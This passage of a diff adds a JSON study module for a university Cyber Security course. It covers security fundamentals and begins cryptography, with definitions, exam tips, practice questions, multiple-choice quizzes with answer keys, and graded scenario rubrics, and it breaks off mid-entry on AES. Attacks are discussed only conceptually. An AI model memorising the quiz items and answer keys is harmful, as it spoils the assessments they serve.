@@ -1,0 +1,1728 @@
+{
+  "id": "cyber",
+  "code": "CS241505",
+  "title": "Cyber Security",
+  "icon": "🛡️",
+  "modules": [
+    {
+      "id": "m1",
+      "num": 1,
+      "title": "Fundamentals of Information Security",
+      "topics": [
+        {
+          "id": "cyber_m1_cia_triad",
+          "cat": "Architecture",
+          "title": "CIA TRIAD: CONFIDENTIALITY, INTEGRITY, AVAILABILITY",
+          "sub": "The Foundational Tripod of Information Security Architecture",
+          "plain": "The foundational tripod of information security. Confidentiality stops unauthorized snooping and data leaks. Integrity stops unauthorized alteration or tampering. Availability guarantees systems and data are ready and accessible whenever authorized users need them.",
+          "def": "The CIA Triad is the universally recognized architectural model for information security engineering: Confidentiality prevents unauthorized disclosure through encryption and access controls; Integrity preserves data accuracy, consistency, and trustworthiness against tampering; Availability ensures authorized principals have timely, reliable access to critical assets and services.",
+          "exam": "Confidentiality = secrecy (prevent snooping). Integrity = correctness (prevent tampering). Availability = accessibility (prevent downtime and resource exhaustion). Always evaluate which specific leg fails during an incident.",
+          "trap": "Exam Trap: Encryption alone only guarantees Confidentiality, NOT Integrity. An attacker who cannot read ciphertext can still flip bits or replay blocks unless a Message Authentication Code (MAC) or authenticated encryption mode (like AES-GCM) is applied.",
+          "example": "Confidentiality: Medical records leaked on the dark web. Integrity: Hacker alters bank balance from $100 to $1,000,000 in transit. Availability: SYN flood crashing an online examination server during a university final.",
+          "q": "A hospital's emergency room electronic health records database is encrypted by ransomware. The files have not been read or altered by attackers, but doctors cannot access patient blood types during trauma surgeries. Which pillar of the CIA triad collapsed?",
+          "a": "Availability. Patient data was neither exfiltrated (Confidentiality intact) nor corrupted (Integrity intact), but authorized clinicians were denied timely access to life-critical operational systems."
+        },
+        {
+          "id": "cyber_m1_active_vs_passive_attacks",
+          "cat": "Attacks",
+          "title": "ACTIVE ATTACKS VS PASSIVE ATTACKS",
+          "sub": "Classification of Threats by Data and Resource Modification",
+          "plain": "Passive attacks eavesdrop on communications without modifying any data, making them virtually invisible to detect. Active attacks tamper with messages, impersonate users, or flood systems, making them easier to detect but causing direct operational damage.",
+          "def": "Per ITU-T X.800 standards, Passive Attacks attempt to learn or make use of information from the system without affecting system resources (e.g., release of message contents, traffic analysis). Active Attacks involve modification of the data stream or creation of a false stream (e.g., masquerade, replay, modification of messages, denial of service).",
+          "exam": "Passive attacks: Goal is eavesdropping; prevention is the primary defense (via encryption); detection is nearly impossible. Active attacks: Goal is alteration/damage; detection and recovery are the primary strategies alongside preventative controls.",
+          "trap": "Exam Trap: Confusing Traffic Analysis with an active attack. Traffic analysis is strictly PASSIVE—the adversary monitors packet lengths, timing, and communication frequency without altering a single bit.",
+          "example": "Passive: Sniffing unencrypted Wi-Fi packets with Wireshark to observe login headers. Active: Performing ARP spoofing to alter bank routing numbers inside an ongoing TCP connection.",
+          "q": "An attacker captures ciphertext packets between two financial institutions and measures transmission frequency and burst volumes to deduce stock trades, without injecting or modifying packets. Classify this attack precisely.",
+          "a": "A passive attack via Traffic Analysis. System state and data streams remained unaltered, but statistical patterns were intercepted to compromise operational confidentiality."
+        },
+        {
+          "id": "cyber_m1_x800_services_mechanisms",
+          "cat": "Standards",
+          "title": "X.800 SECURITY SERVICES AND MECHANISMS",
+          "sub": "ITU-T Standardized Framework for OSI Network Security",
+          "plain": "Security services define WHAT protection a system must provide (like Authentication or Non-repudiation), while security mechanisms define HOW that protection is mathematically or programmatically achieved (like Digital Signatures or Encryption).",
+          "def": "ITU-T Recommendation X.800 defines a Security Service as a processing or communication service provided by a protocol layer to ensure adequate security of data transfers (Authentication, Access Control, Data Confidentiality, Data Integrity, Non-Repudiation), implemented via specific Security Mechanisms (Encipherment, Digital Signature, Access Control Mechanism, Data Integrity, Authentication Exchange, Traffic Padding, Routing Control, Notarization).",
+          "exam": "Know the 5 X.800 Services: Authentication, Access Control, Data Confidentiality, Data Integrity, Non-Repudiation. Know the mapping to Mechanisms: Confidentiality uses Encipherment; Non-Repudiation uses Digital Signatures and Notarization.",
+          "trap": "Exam Trap: Conflating a service with a mechanism. 'Data Integrity' is a desired service goal; 'Cryptographic Hash' and 'Digital Signature' are the technical mechanisms that deliver that service.",
+          "example": "Security Service: Ensuring an e-commerce customer cannot falsely claim they never ordered a laptop (Non-Repudiation). Security Mechanism: Appending an RSA digital signature with timestamp notarization.",
+          "q": "Differentiate between an X.800 Security Service and a Security Mechanism, providing one concrete pair that fulfills message origin authenticity.",
+          "a": "A Security Service is a high-level policy requirement (the 'what'), whereas a Security Mechanism is the technical implementation (the 'how'). For message origin authenticity (Service), the corresponding technical tool is a Digital Signature or Authentication Exchange (Mechanism)."
+        },
+        {
+          "id": "cyber_m1_threats_vulnerabilities_risks",
+          "cat": "Risk Management",
+          "title": "THREATS, VULNERABILITIES, AND RISK ASSESSMENT",
+          "sub": "The Core Equation of Cyber Risk Management: Risk = Threat × Vulnerability × Impact",
+          "plain": "A vulnerability is a weakness or flaw. A threat is a potential danger or actor capable of exploiting that flaw. Risk is the expected damage resulting from a threat successfully striking a vulnerability against an asset.",
+          "def": "A Vulnerability is an inherent flaw or weakness in system design, implementation, or operation. A Threat is any circumstance or event with the potential to adversely impact an asset through unauthorized access, destruction, disclosure, or modification. Risk is the probabilistic expectation of loss, quantitatively modeled as Risk = Likelihood (Threat × Vulnerability) × Impact.",
+          "exam": "Formula: Risk = Threat × Vulnerability × Impact. If any single variable is zero (e.g., no vulnerability exists, or the asset has zero business impact), residual risk is zero.",
+          "trap": "Exam Trap: Saying 'a buffer overflow is a threat.' A buffer overflow is a Vulnerability (a code defect); the Threat is a remote adversary executing arbitrary shellcode through it.",
+          "example": "Vulnerability: Unpatched Log4j library in a web server. Threat: Ransomware gang scanning the internet. Risk: Catastrophic total corporate network compromise and millions in extortion losses.",
+          "q": "An air-gapped nuclear reactor controller has an unauthenticated debug interface listening on an internal serial bus. There is no network connection and physical access is restricted by armed guards. How does this setup affect Threat, Vulnerability, and Risk?",
+          "a": "The vulnerability exists (unauthenticated interface), but the threat likelihood is drastically reduced by physical air-gapping and perimeter isolation, substantially lowering the overall operational risk."
+        },
+        {
+          "id": "cyber_m1_least_privilege",
+          "cat": "Architecture",
+          "title": "PRINCIPLE OF LEAST PRIVILEGE AND SEPARATION OF DUTIES",
+          "sub": "Foundational Tenets of Minimal Trust and Blast Radius Reduction",
+          "plain": "Give every user, process, and program only the minimum permissions necessary to complete their job for the shortest time possible, and never allow a single person complete unchecked power over critical actions.",
+          "def": "The Principle of Least Privilege (PoLP) dictates that every module, process, or user must be able to access only the information and resources necessary for its legitimate operational purpose. Separation of Duties (SoD) requires dividing critical multi-step operations among distinct individuals or systems to prevent fraud, abuse, and catastrophic single-point failures.",
+          "exam": "Least Privilege reduces blast radius when a component is breached. Separation of Duties prevents unilateral insider fraud (e.g., dual-custody for wire transfers).",
+          "trap": "Exam Trap: Assuming Least Privilege only applies to human staff accounts. In modern secure architecture, PoLP applies equally to software services, database connection strings, and containerized microservice daemons.",
+          "example": "A web application's database service account should only have SELECT and INSERT permissions on table orders, with no ALTER TABLE, DROP, or admin permissions.",
+          "q": "A developer configures an automated script with root/superuser privileges so that 'permission errors are avoided during nightly backups.' Which fundamental security principles are violated, and what is the consequence of a script compromise?",
+          "a": "Violates the Principle of Least Privilege. If the script contains a vulnerability or is hijacked via path manipulation, the adversary instantly inherits root control over the entire operating system."
+        },
+        {
+          "id": "cyber_m1_defense_in_depth",
+          "cat": "Architecture",
+          "title": "DEFENSE IN DEPTH: LAYERED SECURITY",
+          "sub": "Eliminating Single Points of Failure via Multi-Tier Controls",
+          "plain": "Never rely on just one security barrier. Layer physical security, network firewalls, endpoint defenses, strict access controls, and data encryption so that if one wall is breached, the next wall stops the attacker.",
+          "def": "Defense in Depth is an architectural strategy deploying multiple redundant, diverse security controls across perimeter, network, host, application, and data layers, ensuring that the compromise of any single defensive control does not result in total system compromise.",
+          "exam": "Layers to mention in ASTU exam: 1. Physical (locks/biometrics), 2. Perimeter (firewalls/IPS), 3. Internal Network (VLANs/microsegmentation), 4. Host (EDR/OS hardening), 5. Application (input validation/WAF), 6. Data (encryption at rest/in transit).",
+          "trap": "Exam Trap: Stacking three firewalls from the same vendor running the identical firmware version is NOT true defense in depth; a single zero-day exploit will bypass all three simultaneously (common mode failure).",
+          "example": "A banking system uses perimeter Next-Gen Firewalls, mutual TLS on internal microservices, mandatory multi-factor authentication, database row-level encryption, and continuous behavioral SIEM monitoring.",
+          "q": "Why is a strong perimeter firewall insufficient to protect an enterprise intranet against modern advanced persistent threats (APTs)?",
+          "a": "Perimeter firewalls do not inspect authenticated insider traffic, cannot inspect encrypted legitimate channels without deep proxying, and provide zero protection if an attacker enters via phishing emails or compromised endpoints."
+        },
+        {
+          "id": "cyber_m1_non_repudiation_authenticity",
+          "cat": "Core",
+          "title": "NON-REPUDIATION AND AUTHENTICITY",
+          "sub": "Proof of Origin, Integrity of Transmission, and Legal Accountability",
+          "plain": "Authenticity proves you are genuinely who you say you are. Non-repudiation guarantees that once you sign or send a message, you cannot later lie and claim someone else sent it or that it was forged.",
+          "def": "Authenticity is the assurance that a communicating entity or message source is genuine and valid. Non-Repudiation provides indisputable cryptographic proof of the origin and integrity of data, preventing an entity from falsely denying having performed a specific transaction or authored a transmitted message.",
+          "exam": "Symmetric MACs provide Authenticity and Integrity between two shared-key parties, but CANNOT provide Non-Repudiation because both parties share the secret. Only Asymmetric Digital Signatures guarantee Non-Repudiation.",
+          "trap": "Exam Trap: Stating that HMAC provides Non-Repudiation. Because Alice and Bob both hold the identical HMAC key, Bob could easily generate a message and forge Alice's HMAC. Alice can repudiate it!",
+          "example": "A digital signature on a digital real estate contract registered under the IT Act 2000 uses the seller's private key, making it impossible for the seller in court to deny signing the deed.",
+          "q": "Alice and Bob share a secret symmetric key K and use HMAC-SHA256 to sign financial transactions. Can Bob prove to a judge that Alice sent a disputed transfer of $50,000? Justify.",
+          "a": "No. Because symmetric HMAC uses a shared secret known to both Alice and Bob, Bob could have synthesized the HMAC himself. Symmetric keys cannot provide Non-Repudiation; an asymmetric digital signature is required."
+        },
+        {
+          "id": "cyber_m1_access_control_models",
+          "cat": "Access Control",
+          "title": "ACCESS CONTROL MODELS: DAC, MAC, RBAC, ABAC",
+          "sub": "Mechanisms for Authorizing Principals to System Objects",
+          "plain": "DAC lets the owner decide who gets access. MAC enforces strict government-level security clearances. RBAC grants access based on your job role. ABAC evaluates real-time attributes like time, location, and device health.",
+          "def": "Access Control Models govern permission assignments: Discretionary Access Control (DAC) allows resource owners to grant permissions at their discretion; Mandatory Access Control (MAC) enforces system-wide multi-level security labels (e.g., Bell-LaPadula); Role-Based Access Control (RBAC) binds permissions to roles and users to roles; Attribute-Based Access Control (ABAC) evaluates dynamic Boolean attributes (user, resource, environmental).",
+          "exam": "Comparison matrix: DAC = Owner controls (Linux chmod). MAC = Central authority + labels (Top Secret/Confidential). RBAC = Enterprise roles (Doctor, Nurse). ABAC = Contextual attributes (Doctor, on-shift, at hospital IP).",
+          "trap": "Exam Trap: Confusing RBAC with ABAC. RBAC is static (role assignment); ABAC is dynamic (evaluates environmental context like IP geolocation, time-of-day, and device compliance).",
+          "example": "Military uses MAC with clearance levels. A hospital uses RBAC for clinical records, upgrading to ABAC to deny off-duty clinicians access to VIP patient charts from external residential IPs.",
+          "q": "In a corporate file server, employee Alice owns a spreadsheet and uses chmod 777 to allow all employees write access. Which access control paradigm is in use, and why does it fail in high-assurance environments?",
+          "a": "Discretionary Access Control (DAC). It fails in high-assurance environments because data owners can recklessly or maliciously reassign permissions contrary to organizational security policy."
+        },
+        {
+          "id": "cyber_m1_zero_trust_architecture",
+          "cat": "Architecture",
+          "title": "ZERO TRUST ARCHITECTURE (ZTA)",
+          "sub": "The Paradigm Shift: 'Never Trust, Always Verify'",
+          "plain": "Traditional security trusted anyone inside the corporate network. Zero Trust treats the corporate network as hostile, requiring every user, device, and API request to be authenticated, authorized, and encrypted every single time.",
+          "def": "Zero Trust Architecture (NIST SP 800-207) is an enterprise cybersecurity architecture based on the premise that trust is never granted implicitly, regardless of location or ownership. It mandates strict identity verification, micro-segmentation, least privilege enforcement, and continuous contextual telemetry across every access transaction.",
+          "exam": "Three Core Tenets of Zero Trust: 1. Verify explicitly (always authenticate and authorize). 2. Use least privileged access (Just-In-Time and Just-Enough-Access). 3. Assume breach (minimize blast radius, segment access, inspect and log all traffic).",
+          "trap": "Exam Trap: Zero Trust is NOT a single product, firewall, or software package. It is an architectural framework and operational mindset governing all authentication, network, and data flows.",
+          "example": "An employee connecting a laptop from headquarters Wi-Fi must authenticate with FIDO2 MFA, pass a device health check, and get an ephemeral token to query a microservice—exactly as if connecting from a public café.",
+          "q": "Explain the fundamental difference between the traditional 'Castle-and-Moat' network security perimeter and a modern Zero Trust Architecture.",
+          "a": "The castle-and-moat perimeter implicitly trusts any packet once inside the corporate firewall. Zero Trust eliminates implicit trust entirely: every internal packet and user must continuously authenticate and authorize."
+        },
+        {
+          "id": "cyber_m1_attack_surfaces_threat_vectors",
+          "cat": "Threat Modeling",
+          "title": "ATTACK SURFACES, THREAT VECTORS, AND ATTACK TREES",
+          "sub": "Methodologies for Modeling System Vulnerabilities and Adversary Paths",
+          "plain": "An attack surface is the total number of points where an unauthorized user can try to enter or extract data. A threat vector is the specific path they take (like phishing or unpatched software). An attack tree maps out all possible ways an attacker can reach a goal.",
+          "def": "The Attack Surface is the aggregate sum of all reachable entry points, network interfaces, APIs, code paths, and human touchpoints that can be exploited by an adversary. A Threat Vector is the specific transmission medium or exploit pathway utilized to deliver a payload. An Attack Tree is a conceptual tree diagram displaying paths to achieve an adversarial objective as a root node with branches representing sub-goals.",
+          "exam": "Attack Surface Reduction (ASR) is a core hardening strategy: disabling unnecessary services, closing unused open ports, restricting public APIs, and sanitizing user inputs.",
+          "trap": "Exam Trap: Thinking attack surface is solely software. The human workforce (susceptible to social engineering) and supply chain hardware are major components of an organization's holistic attack surface.",
+          "example": "Closing open port 23 (Telnet) on an industrial controller and requiring SSH on port 22 reduces the network attack surface by eliminating unencrypted plaintext remote admin interfaces.",
+          "q": "A company reduces its exposed attack surface by shutting down unused microservices and decommissioning old staging APIs. How does this lower organizational risk?",
+          "a": "It removes reachable entry points and lines of code that could contain unpatched vulnerabilities, eliminating potential threat vectors that attackers could use to establish an initial foothold."
+        },
+        {
+          "id": "cyber_m1_security_governance_iso27001",
+          "cat": "Governance",
+          "title": "INFORMATION SECURITY GOVERNANCE AND ISO/IEC 27001",
+          "sub": "Frameworks for Systematic Enterprise Risk Management and Compliance",
+          "plain": "Security isn't just firewalls; it's also company policies, employee training, incident response procedures, and regular audits. ISO 27001 is the international gold standard for managing information security systematically.",
+          "def": "Information Security Governance establishes the leadership, organizational structures, policies, and processes that safeguard enterprise information assets. ISO/IEC 27001 is the international standard specifying requirements for establishing, implementing, maintaining, and continually improving an Information Security Management System (ISMS) based on the Plan-Do-Check-Act (PDCA) cycle.",
+          "exam": "The PDCA cycle: Plan (establish ISMS, risk assessment, policies), Do (implement controls), Check (monitor, internal audit, review), Act (take corrective and preventive actions).",
+          "trap": "Exam Trap: Believing ISO 27001 mandates specific encryption algorithms or hardware brands. ISO 27001 defines a risk management process and governance framework, not vendor-specific technical configurations.",
+          "example": "A cloud SaaS company achieves ISO 27001 certification by drafting access control policies, enforcing mandatory quarterly employee phishing simulations, conducting annual third-party penetration tests, and maintaining a risk register.",
+          "q": "What is an Information Security Management System (ISMS), and what core iterative methodology does ISO 27001 utilize to ensure continuous improvement?",
+          "a": "An ISMS is a systematic framework of policies, procedures, and controls for managing sensitive enterprise data risks. It utilizes the Plan-Do-Check-Act (PDCA) cycle to achieve continual evaluation and improvement."
+        }
+      ],
+      "quiz": [
+        {
+          "q": "An attacker intercepts and silently monitors ciphertext packets transmitted between a bank and an ATM without modifying any bits. Which CIA property is primarily threatened, and how is this attack categorized under X.800?",
+          "opts": [
+            "Integrity; Active attack",
+            "Confidentiality; Passive attack",
+            "Availability; Active attack",
+            "Authenticity; Passive attack"
+          ],
+          "ans": 1,
+          "cat": "CIA / Attacks",
+          "correctFb": "Eavesdropping on communications threatens Confidentiality. Because the transmitted bits and system state remain completely unmodified, it is classified as a Passive attack.",
+          "distractors": [
+            "Integrity attacks require modifying, reordering, or injecting data bits.",
+            "Availability attacks involve disruption or resource exhaustion like DoS.",
+            "Authenticity involves forging user identity or message origin."
+          ]
+        },
+        {
+          "q": "Which of the following X.800 security mechanisms is cryptographically required to achieve the security service of Non-Repudiation?",
+          "opts": [
+            "Symmetric Stream Cipher Encipherment",
+            "Digital Signature with Asymmetric Cryptography",
+            "Data Padding and Traffic Rate Injection",
+            "Routing Control Mechanisms"
+          ],
+          "ans": 1,
+          "cat": "X.800 Standards",
+          "correctFb": "Non-repudiation requires indisputable proof of origin that cannot be forged by the recipient. Only asymmetric digital signatures provide this property because only the sender holds the unique private key.",
+          "distractors": [
+            "Symmetric ciphers use shared keys; either party could have authored the message, defeating non-repudiation.",
+            "Traffic padding disguises transmission volume to counter passive traffic analysis.",
+            "Routing control chooses secure physical paths but does not cryptographically bind identity to message payload."
+          ]
+        },
+        {
+          "q": "In quantitative risk management, an enterprise identifies an unpatched web vulnerability with an estimated monetary impact of $500,000. However, the application is deployed on an isolated intranet with zero threat actor access. What is the calculated risk?",
+          "opts": [
+            "$500,000 because vulnerability severity determines ultimate risk",
+            "Zero (or negligible) because Threat likelihood is zero in Risk = Threat × Vulnerability × Impact",
+            "$250,000 based on standard 50% baseline vulnerability weighting",
+            "Indeterminate because qualitative metrics override quantitative formulas"
+          ],
+          "ans": 1,
+          "cat": "Risk Management",
+          "correctFb": "Under the standard risk equation Risk = Threat × Vulnerability × Impact, if Threat likelihood is zero (no adversary can reach or exploit the asset), the resulting mathematical risk evaluates to zero.",
+          "distractors": [
+            "Vulnerability severity alone does not equal risk without an active threat capable of exploiting it.",
+            "Arbitrary 50% weighting contradicts standard NIST quantitative risk calculation principles.",
+            "Quantitative formulas yield concrete probabilistic loss values when threat vectors and impacts are defined."
+          ]
+        },
+        {
+          "q": "A junior system administrator runs a Dockerized payment microservice with the '--privileged' flag and root user credentials. Which foundational security principle is violated?",
+          "opts": [
+            "Separation of Duties",
+            "Principle of Least Privilege",
+            "Complete Mediation",
+            "Fail-Safe Defaults"
+          ],
+          "ans": 1,
+          "cat": "Architecture",
+          "correctFb": "The Principle of Least Privilege mandates that subjects must operate using only the minimal privileges necessary to complete their task. Running containers as privileged root grants excessive capabilities that enable container escape.",
+          "distractors": [
+            "Separation of duties divides multi-step tasks among multiple human operators.",
+            "Complete mediation requires checking authorization on every single resource access.",
+            "Fail-safe defaults mandate that the default access decision must be denial."
+          ]
+        },
+        {
+          "q": "Why does a message authenticated solely with an HMAC-SHA256 tag fail to provide legal Non-Repudiation between two communicating parties, Alice and Bob?",
+          "opts": [
+            "HMAC algorithms are vulnerable to length extension attacks",
+            "Both Alice and Bob possess the identical shared secret key, allowing Bob to forge the tag",
+            "SHA-256 has been broken by practical collision generation attacks",
+            "HMAC only verifies packet sequence numbers, not payload integrity"
+          ],
+          "ans": 1,
+          "cat": "Core Security",
+          "correctFb": "HMAC relies on a symmetric shared secret. Because both Alice and Bob hold the exact same key, Bob could easily generate a valid HMAC tag for any arbitrary message, meaning Alice can plausibly deny authoring it in court.",
+          "distractors": [
+            "HMAC's nested construction is specifically engineered to defeat length extension attacks.",
+            "SHA-256 remains cryptographically secure with zero practical collisions detected.",
+            "HMAC validates cryptographic payload integrity and authenticity, not network sequence numbers."
+          ]
+        },
+        {
+          "q": "In a military classification system, an officer with 'Secret' clearance is mathematically prohibited from reading a 'Top Secret' document. Which access control model enforces this rule via mandatory security labels?",
+          "opts": [
+            "Discretionary Access Control (DAC)",
+            "Mandatory Access Control (MAC)",
+            "Role-Based Access Control (RBAC)",
+            "Attribute-Based Access Control (ABAC)"
+          ],
+          "ans": 1,
+          "cat": "Access Control",
+          "correctFb": "Mandatory Access Control (MAC) enforces system-wide multi-level security policies based on fixed data classification labels and subject clearance levels (such as the Bell-LaPadula model).",
+          "distractors": [
+            "DAC leaves permission assignment to the discretion of individual file owners.",
+            "RBAC binds permissions to enterprise business functions rather than security clearance labels.",
+            "ABAC evaluates dynamic Boolean attribute policies rather than rigid multi-level clearance hierarchies."
+          ]
+        },
+        {
+          "q": "Which of the following statements embodies the 'Assume Breach' tenet of Zero Trust Architecture (NIST SP 800-207)?",
+          "opts": [
+            "Assume all external incoming perimeter firewall packets are malicious while trusting internal LAN subnet traffic",
+            "Operate under the premise that adversaries already reside inside the network; restrict blast radius via micro-segmentation and inspect all sessions",
+            "Disable all automated intrusion prevention systems to avoid false positive disruptions",
+            "Mandate that all internal enterprise data must remain completely unencrypted to facilitate continuous inspection"
+          ],
+          "ans": 1,
+          "cat": "Zero Trust",
+          "correctFb": "'Assume Breach' presumes an adversary has already obtained an internal foothold. Organizations therefore enforce internal micro-segmentation, per-session authentication, and end-to-end encryption to limit lateral movement.",
+          "distractors": [
+            "Trusting internal LAN subnet traffic is the obsolete Castle-and-Moat perimeter model.",
+            "Disabling intrusion prevention directly degrades automated threat response.",
+            "Unencrypted data directly violates Zero Trust mandates for pervasive end-to-end encryption."
+          ]
+        },
+        {
+          "q": "Which defense exemplifies true 'Defense in Depth' for protecting critical customer database records against external compromise?",
+          "opts": [
+            "Deploying three firewalls from the exact same vendor in serial succession at the network perimeter",
+            "Combining perimeter next-gen firewalls, internal network micro-segmentation, host-based EDR, parameterized SQL queries, and column-level database encryption",
+            "Relying exclusively on complex 24-character database passwords while keeping open ports exposed to the internet",
+            "Air-gapping the web server while exposing the database directly to external public DNS"
+          ],
+          "ans": 1,
+          "cat": "Architecture",
+          "correctFb": "True Defense in Depth utilizes diverse, layered controls across perimeter, network, endpoint, application, and data layers so that no single control failure leads to total system compromise.",
+          "distractors": [
+            "Identical firewalls share common vulnerabilities and firmware bugs, creating a single point of failure.",
+            "Relying solely on passwords ignores network exploitation, credential dumping, and MITM sniffing.",
+            "Exposing the database directly to public DNS creates a catastrophic critical attack vector."
+          ]
+        },
+        {
+          "q": "In threat modeling, what is the primary structural difference between an Attack Surface and a Threat Vector?",
+          "opts": [
+            "Attack surface is the path used to deliver a payload; threat vector is the total lines of code",
+            "Attack surface is the sum of all exposed entry points; threat vector is the specific pathway or technique an adversary exploits to reach an asset",
+            "Attack surface applies only to hardware; threat vector applies exclusively to social engineering",
+            "Threat vectors represent defensive controls; attack surfaces represent adversarial tools"
+          ],
+          "ans": 1,
+          "cat": "Threat Modeling",
+          "correctFb": "The attack surface is the totality of all exposed endpoints, services, and interfaces where an attacker can attempt entry. The threat vector is the specific route or mechanism (e.g., phishing link, unpatched API) used to execute the attack.",
+          "distractors": [
+            "Reversing the definitions confuses reachable exposure with the exploit pathway.",
+            "Attack surfaces encompass software, hardware, networks, and human personnel.",
+            "Threat vectors are offensive pathways, not defensive security controls."
+          ]
+        },
+        {
+          "q": "What is the primary operational methodology used by ISO/IEC 27001 to ensure that an Information Security Management System (ISMS) continuously improves over time?",
+          "opts": [
+            "Waterfall Development Lifecycle",
+            "Plan-Do-Check-Act (PDCA) Deming Cycle",
+            "Agile Scrum 2-week Sprint Burndown",
+            "Six Sigma DMAIC Quality Reduction"
+          ],
+          "ans": 1,
+          "cat": "Governance",
+          "correctFb": "ISO/IEC 27001 ISMS governance is structured around the Plan-Do-Check-Act (PDCA) iterative cycle: Plan (establish context and policies), Do (implement controls), Check (audit and monitor), and Act (maintain and improve).",
+          "distractors": [
+            "Waterfall is a linear software engineering model that lacks iterative security feedback loops.",
+            "Agile Scrum is a software development sprint framework, not an information security governance standard.",
+            "Six Sigma DMAIC focuses primarily on manufacturing defect reduction rather than ISMS compliance."
+          ]
+        }
+      ],
+      "bossChallenges": [
+        {
+          "marks": 10,
+          "scenario": "A state university launches a unified web portal for semester examinations, grade publication, and fee payments. During peak finals week, the server crashes due to a resource exhaustion attack, while malicious tampering alters student grade databases. Conduct an exhaustive architectural review: define the CIA triad and Defense in Depth, explain how each layer broke down in this incident, and present a hardened multi-tier architecture to prevent future attacks.",
+          "rubric": [
+            "Formal Definition & CIA Analysis (2.5 marks): Academic definition of Confidentiality, Integrity, and Availability; identification of the Availability failure (DDoS/crash) and Integrity failure (tampered grades).",
+            "Defense in Depth Breakdown (2.5 marks): Systematic analysis of failures across Perimeter (no rate-limiting), Application (unvalidated input), Database (lack of row signing), and Host layers.",
+            "Hardened Architectural Design (2.5 marks): Concrete blueprint specifying Cloud WAF/Anti-DDoS, micro-segmented subnets, TLS 1.3, parameterized SQL queries, and cryptographic database write-ahead log auditing.",
+            "Exam Traps & Operational Governance (2.5 marks): Explicit distinction between active and passive attacks, avoiding single-vendor traps, and establishing an ISO 27001 PDCA review schedule."
+          ]
+        },
+        {
+          "marks": 5,
+          "scenario": "A municipal hospital experiences an advanced ransomware intrusion that encrypts electronic health records. The attackers demand 15 Bitcoins for the decryption key. As Chief Information Security Officer, outline your immediate 4-phase incident response strategy to contain damage, preserve forensic evidence, restore clinical operations, and prevent recurrence.",
+          "rubric": [
+            "Diagnostic & Blast Radius Triage (1.25 marks): Immediate network segmentation, isolating infected VLANs, and confirming that the incident is primarily an Availability failure.",
+            "Evidence Preservation (1.25 marks): Live volatile RAM capture before powering down machines, avoiding contamination of forensic disk artifacts.",
+            "Operational Recovery (1.25 marks): Restoring clinical services from immutable, air-gapped, offline backups verified with cryptographic hashes rather than paying extortion.",
+            "Hardening & Preventative Controls (1.25 marks): Implementing Zero Trust network access, endpoint detection and response (EDR), and least-privilege service account restrictions."
+          ]
+        }
+      ]
+    },
+    {
+      "id": "m2",
+      "num": 2,
+      "title": "Cryptography and Network Security",
+      "topics": [
+        {
+          "id": "cyber_m2_classical_ciphers",
+          "cat": "Classical Cryptography",
+          "title": "CLASSICAL CIPHERS: SUBSTITUTION AND TRANSPOSITION",
+          "sub": "Historical Foundations of Symmetric Cryptographic Algorithms",
+          "plain": "Classical ciphers rely on two fundamental techniques: Substitution (swapping one letter or symbol for another) and Transposition (scrambling the physical order of letters). Both are easily cracked today using letter frequency analysis.",
+          "def": "Classical cryptography encompasses encryption techniques developed prior to modern computational mathematics: Substitution Ciphers replace plaintext elements with ciphertext elements (e.g., Caesar, Monoalphabetic, Playfair, Polyalphabetic Vigenère); Transposition Ciphers rearrange the positional order of plaintext characters without altering their identities (e.g., Rail Fence, Columnar Transposition).",
+          "exam": "Substitution changes the identity of letters (vulnerable to frequency analysis). Transposition changes the position of letters (letter frequencies remain identical to plaintext).",
+          "trap": "Exam Trap: Believing that combining multiple monoalphabetic substitutions increases key strength. The composition of two substitutions is simply another substitution, providing zero additional cryptographic resistance.",
+          "example": "Caesar Cipher shifts letters by +3 (A -> D). Playfair encrypts letter pairs using a 5x5 matrix. Columnar Transposition writes message into rows and reads out by keyed columns.",
+          "q": "An analyst inspects an intercepted ciphertext and discovers that the frequency distribution of individual characters perfectly matches the statistical distribution of normal English text. Which cipher class was used?",
+          "a": "A Transposition cipher. Because characters are merely rearranged positionally without altering their identities, unigram character frequencies remain identical to the underlying plaintext."
+        },
+        {
+          "id": "cyber_m2_symmetric_block_stream",
+          "cat": "Symmetric Cryptography",
+          "title": "SYMMETRIC CRYPTOGRAPHY: BLOCK CIPHERS VS STREAM CIPHERS",
+          "sub": "Shannon's Principles of Confusion and Diffusion in Shared-Key Systems",
+          "plain": "Symmetric ciphers use the same secret key for both locking and unlocking data. Block ciphers process fixed-size chunks of data (like 128 bits) at once, while stream ciphers encrypt data bit-by-bit or byte-by-byte in real time.",
+          "def": "Symmetric Key Cryptography uses a single shared secret key K for both encryption and decryption. Block Ciphers partition plaintext into fixed-length blocks of size b (e.g., 128 bits) and transform them under the key using iterative rounds of substitution and permutation. Stream Ciphers generate a pseudorandom keystream combined via XOR with plaintext bits one by one. Both implement Claude Shannon's principles: Confusion (obscuring key-ciphertext relationships) and Diffusion (spreading plaintext statistics across ciphertext).",
+          "exam": "Shannon's Confusion is achieved via non-linear S-boxes (substitution). Diffusion is achieved via permutations and linear mixing (spreading one plaintext bit's influence across many ciphertext bits).",
+          "trap": "Exam Trap: Reusing a stream cipher key and Nonce/IV. If keystream KS is reused: C1 XOR C2 = (P1 XOR KS) XOR (P2 XOR KS) = P1 XOR P2. Plaintext is instantly recoverable through two-time pad cryptanalysis!",
+          "example": "Block cipher: AES-128 processing 128-bit blocks through 10 rounds. Stream cipher: ChaCha20 or RC4 generating continuous keystreams for real-time video streaming.",
+          "q": "Explain Claude Shannon's concepts of Confusion and Diffusion, and identify which specific component of modern block ciphers implements each.",
+          "a": "Confusion obscures the mathematical relationship between the secret key and the ciphertext (implemented via non-linear Substitution boxes or S-Boxes). Diffusion spreads the influence of a single plaintext bit across many ciphertext bits (implemented via Permutations, ShiftRows, and MixColumns)."
+        },
+        {
+          "id": "cyber_m2_aes_architecture",
+          "cat": "Symmetric Cryptography",
+          "title": "ADVANCED ENCRYPTION STANDARD (AES) ARCHITECTURE",
+          "sub": "NIST FIPS 197 Standardized Symmetric Block Cipher (Rijndael)",
+          "plain": "AES is the worldwide standard symmetric cipher. It operates on 128-bit data blocks using keys of 128, 192, or 256 bits. In each round, it substitutes bytes, shifts rows, mixes columns, and adds a round key to thoroughly scramble the data.",
+          "def": "AES (Rijndael) is a symmetric block cipher standardized by NIST in 2001 (FIPS 197). It processes a 4x4 matrix of bytes called the State array (128-bit block size). Key lengths dictate round counts: 128-bit keys use 10 rounds; 192-bit keys use 12 rounds; 256-bit keys use 14 rounds. Each standard round executes four mathematical transformations: SubBytes, ShiftRows, MixColumns, and AddRoundKey.",
